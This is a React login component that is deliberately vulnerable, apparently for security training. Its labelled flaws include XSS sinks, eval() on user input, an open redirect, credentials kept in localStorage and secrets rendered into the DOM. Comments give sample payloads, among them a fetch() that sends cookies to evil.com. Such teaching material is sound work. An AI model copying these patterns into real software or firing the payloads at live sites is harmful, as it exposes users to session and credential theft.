/**
 * ⚠️ VULNERABLE BY DESIGN - DO NOT USE IN PRODUCTION ⚠️
 *
 * Login Component with INTENTIONAL vulnerabilities:
 * - XSS via dangerouslySetInnerHTML
 * - eval() on user input
 * - DOM-based XSS
 * - Credential exposure
 * - Weak client-side validation
 */

import React, { Component } from 'react';
import $ from 'jquery';
import { apiRequest, API_KEY, ADMIN_PASSWORD } from '../utils/api';

class Login extends Component {
  constructor(props) {
    super(props);
    this.state = {
      username: '',
      password: '',
      error: '',
      welcomeMessage: '',
      rememberMe: false
    };
  }

  // ============================================================
  // VULNERABILITY: XSS via dangerouslySetInnerHTML (CWE-79)
  // ============================================================
  // User input rendered as HTML without sanitization
  // Attack: username = <img src=x onerror="alert(document.cookie)">
  // ============================================================

  renderWelcome() {
    const { welcomeMessage } = this.state;
    return (
      <div
        dangerouslySetInnerHTML={{ __html: welcomeMessage }}
      />
    );
  }

  renderError() {
    // VULNERABILITY: XSS in error message
    // Error from server rendered as HTML
    return (
      <div
        className="error"
        dangerouslySetInnerHTML={{ __html: this.state.error }}
      />
    );
  }

  handleLogin = async (e) => {
    e.preventDefault();

    const { username, password } = this.state;

    // VULNERABILITY: Client-side only validation
    // Easily bypassed - real validation must be server-side
    if (username.length < 3) {
      this.setState({ error: 'Username too short' });
      return;
    }

    // ============================================================
    // VULNERABILITY: eval() on user input (CWE-95)
    // ============================================================
    // Attack: username = '); alert(document.cookie); //
    // Or: username = '); fetch('http://evil.com/steal?c='+document.cookie); //
    // ============================================================

    try {
      // "Sanitizing" input with eval - TERRIBLE IDEA
      const sanitizedUsername = eval('("' + username + '")');

      const response = await apiRequest('/api/auth/login', {
        method: 'POST',
        body: JSON.stringify({
          username: sanitizedUsername,
          password: password
        })
      });

      if (response.success) {
        // VULNERABILITY: Storing sensitive data in localStorage (CWE-922)
        // Can be accessed by XSS attacks
        localStorage.setItem('authToken', response.token);
        localStorage.setItem('password', password);  // TERRIBLE!
        localStorage.setItem('userId', response.userId);

        // VULNERABILITY: XSS via welcome message from server
        this.setState({
          welcomeMessage: `Welcome back, <b>${username}</b>! ${response.message || ''}`
        });

        // Redirect after login
        window.location.href = response.redirectUrl || '/dashboard';
      } else {
        // VULNERABILITY: Error message reflects input (Reflected XSS)
        this.setState({
          error: `Login failed for user: ${username}. ${response.error || ''}`
        });
      }
    } catch (error) {
      this.setState({ error: error.message });
    }
  };

  handleForgotPassword = () => {
    const { username } = this.state;

    // ============================================================
    // VULNERABILITY: DOM-based XSS via URL (CWE-79)
    // ============================================================
    // Attacker can craft URL with malicious payload
    // ============================================================

    // Reading from URL without sanitization
    const urlParams = new URLSearchParams(window.location.search);
    const returnUrl = urlParams.get('returnUrl');

    // VULNERABILITY: Open Redirect (CWE-601)
    // Attack: ?returnUrl=http://evil-phishing-site.com
    if (returnUrl) {
      window.location.href = returnUrl;
      return;
    }

    // VULNERABILITY: DOM XSS via document.write
    document.write('<h1>Password Reset</h1><p>Reset link sent to: ' + username + '</p>');
  };

  handleRememberMe = (e) => {
    // ============================================================
    // VULNERABILITY: jQuery html() XSS (CVE-2020-11022)
    // ============================================================
    // Using jQuery .html() with user input
    // ============================================================

    const checked = e.target.checked;
    this.setState({ rememberMe: checked });

    // VULNERABILITY: XSS via jQuery
    $('#remember-status').html(
      checked
        ? `<span>Will remember: ${this.state.username}</span>`
        : '<span>Will not remember</span>'
    );
  };

  componentDidMount() {
    // ============================================================
    // VULNERABILITY: URL-based XSS (CWE-79)
    // ============================================================
    // Attack: ?message=<script>alert(1)</script>
    // ============================================================

    const params = new URLSearchParams(window.location.search);
    const message = params.get('message');

    if (message) {
      // VULNERABILITY: Directly inserting URL param into DOM
      document.getElementById('notification').innerHTML = message;
    }

    // VULNERABILITY: Checking hash for XSS
    // Attack: #<img src=x onerror=alert(1)>
    if (window.location.hash) {
      const hashContent = decodeURIComponent(window.location.hash.slice(1));
      $('#hash-content').html(hashContent);
    }
  }

  // ============================================================
  // VULNERABILITY: Exposing credentials in render (CWE-200)
  // ============================================================
  renderDebugInfo() {
    return (
      <div className="debug-info" style={{ display: 'none' }}>
        {/* Hidden but still in DOM - accessible via DevTools */}
        <p>API Key: {API_KEY}</p>
        <p>Admin Password: {ADMIN_PASSWORD}</p>
        <p>Current Password: {this.state.password}</p>
      </div>
    );
  }

  render() {
    const { username, password, rememberMe } = this.state;

    return (
      <div className="login-container">
        <h1>Death Cocktail Login</h1>

        <div id="notification"></div>
        <div id="hash-content"></div>

        {this.renderWelcome()}
        {this.renderError()}

        <form onSubmit={this.handleLogin}>
          <div className="form-group">
            <label>Username:</label>
            <input
              type="text"
              value={username}
              onChange={(e) => this.setState({ username: e.target.value })}
              // VULNERABILITY: No input sanitization
              // VULNERABILITY: autocomplete on for sensitive field
              autoComplete="on"
            />
          </div>

          <div className="form-group">
            <label>Password:</label>
            <input
              type="password"
              value={password}
              onChange={(e) => this.setState({ password: e.target.value })}
              autoComplete="on"
            />
          </div>

          <div className="form-group">
            <label>
              <input
                type="checkbox"
                checked={rememberMe}
                onChange={this.handleRememberMe}
              />
              Remember me
            </label>
            <div id="remember-status"></div>
          </div>

          <button type="submit">Login</button>
          <button type="button" onClick={this.handleForgotPassword}>
            Forgot Password
          </button>
        </form>

        {this.renderDebugInfo()}

        {/* VULNERABILITY: Inline event handler with user data */}
        <button onClick={() => eval(`console.log('User: ${username}')`)}>
          Debug
        </button>
      </div>
    );
  }
}

export default Login;
